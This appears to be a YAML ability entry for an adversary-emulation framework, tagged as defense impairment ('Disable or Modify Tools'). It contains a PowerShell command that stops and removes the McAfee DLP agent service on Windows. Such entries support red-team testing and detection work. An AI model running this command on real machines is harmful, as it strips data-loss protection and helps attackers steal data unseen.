  tactic: defense-impairment
  technique:
    attack_id: T1685
    name: Disable or Modify Tools
  platforms:
    windows:
      psh:
        command: |-
          Stop-Service -Name McAfeeDLPAgentService
          Remove-Service -Name McAfeeDLPAgentService
